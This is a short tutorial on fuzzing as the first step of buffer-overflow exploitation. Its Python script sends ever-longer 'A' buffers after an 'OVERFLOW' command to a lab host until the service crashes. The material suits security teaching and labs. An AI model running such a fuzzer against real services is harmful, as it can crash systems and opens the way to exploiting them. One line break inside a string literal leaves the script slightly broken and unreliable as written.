Fuzzing to Discover Vulnerabilities

Systematically sending malformed data to identify program crashes.

What is Fuzzing?

Fuzzing is the process of sending increasingly large amounts of data to a vulnerable input field until the program crashes. This indicates a potential buffer overflow.

  • Identify vulnerable input fields.
  • Send progressively larger buffers (e.g., 'A' * 100, 'A' * 200).
  • Observe for program crashes or abnormal behavior.
  • Python scripts are commonly used for automation.
Key Takeaway

Fuzzing is the initial discovery phase, where controlled malformed input is used to trigger a program crash, signaling a buffer overflow vulnerability.

Example: Python Fuzzing Script

import socket

target_ip = "192.168.1.10" # Vulnerable Windows machine
target_port = 9999 # Port of the vulnerable application

buffer_size = 100
increment = 100

while True:
    buffer = b"A" * buffer_size
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(b"OVERFLOW " + buffer + b"\r
")
        s.recv(1024)
        s.close()
        print(f"Sent {len(buffer)} bytes.")
        buffer_size += increment
    except Exception as e:
        print(f"Program crashed at {buffer_size} bytes or could not connect: {e}")
        break

This script sends increasing lengths of 'A's. When the program crashes, the `except` block catches the error, indicating the approximate buffer size that caused the overflow.
